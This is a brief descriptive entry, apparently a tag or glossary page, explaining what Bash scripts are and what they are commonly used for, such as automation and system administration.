# bash-script
 
 Bash script refers to a script or a program written in the Bash scripting language. Bash (Bourne-Again SHell) is a Unix shell and command-line language that provides a command-line interface (CLI) for interacting with the operating system.

Bash scripts are a series of commands and instructions that are written in a plain text file and executed in a terminal. They are typically used for automating repetitive tasks, system administration, and other command-line operations.

Bash scripts can include conditional statements, loops, variables, and functions, among other features, which can make them powerful tools for performing complex tasks. Bash scripts can also call other scripts or system commands, making them highly versatile.
